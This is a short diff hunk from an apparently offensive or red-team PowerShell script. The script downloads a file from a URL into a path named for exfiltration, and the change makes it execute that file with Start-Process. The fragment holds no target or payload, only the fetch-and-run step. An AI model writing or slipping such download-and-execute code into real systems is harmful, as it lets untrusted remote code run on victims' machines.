@@ -17,7 +17,7 @@ if (Test-Path -Path $Folder) {
     "Grabbing file"
     Invoke-WebRequest -URI $URL -OutFile $ExfilPath
     "Running file"
-    $ExfilPath
+    Start-Process -FilePath $ExfilPath
   } else {
     "Will not exfil"
   }
